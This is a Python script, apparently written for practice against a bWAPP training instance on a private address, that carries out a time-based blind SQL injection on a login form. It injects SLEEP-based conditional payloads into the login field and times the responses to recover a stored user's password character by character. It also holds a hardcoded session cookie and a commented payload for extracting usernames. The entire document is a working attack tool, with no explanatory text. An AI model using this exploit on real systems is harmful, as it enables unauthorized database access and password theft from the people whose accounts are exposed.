# importing the requests library 
import requests 
import socket
import http.server
import socketserver
import threading
import time
import sys
from time import perf_counter
from urllib.parse import urlparse
from urllib.parse import parse_qs

r = requests.Session()

head= {
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'close'
}

URL = "http://192.168.106.147/bWAPP/sqli_16.php"

PARAMS = {
'login':'bee', 
'password':'bug',
'form' : 'submit'
}

cookies = {
'PHPSESSID' : 'eed168ee62ad2abf6cc905aa1bdd5b34',
'security_level' : '0'
}

#out = r.post(URL, data = PARAMS, cookies=cookies)
#print(out.status_code)
#print(out.text)
first_payload = "fakeuser' AND ((SELECT IF(SUBSTRING(password,1,"
third_payload = ") = '"
second_payload = "',SLEEP(1),null) FROM users WHERE id = 2))#"
answer = ""


def sqli_user_brute(answer):
	end_flag = 0
	index = 1
	while (end_flag == 0):
		for n in characters:
			if (n == ''):
				print("End of list!")
				end_flag = 1
				return answer
			start = perf_counter()
			PARAMS["login"] = first_payload + str(index) + third_payload + answer + n + second_payload
			#print("brute char = " + n)
			out = r.post(URL, data = PARAMS, cookies=cookies)
			stop = perf_counter()
			#print("Elapsed time:", stop - start) 
			if ((stop-start) > 1):
				print("char found!")
				answer = answer + n
				print(answer)
				index = index + 1
				break 


char_list = open('charlist.txt')
characters = char_list.read().split('\n')
answer = sqli_user_brute(answer)
print("CONGRATS! FINAL PASSWORD = " +answer)

























#payload =  fakeuser' AND ((SELECT IF(SUBSTRING(login,1,1) = 'a',SLEEP(5),null) FROM users WHERE id = 2))#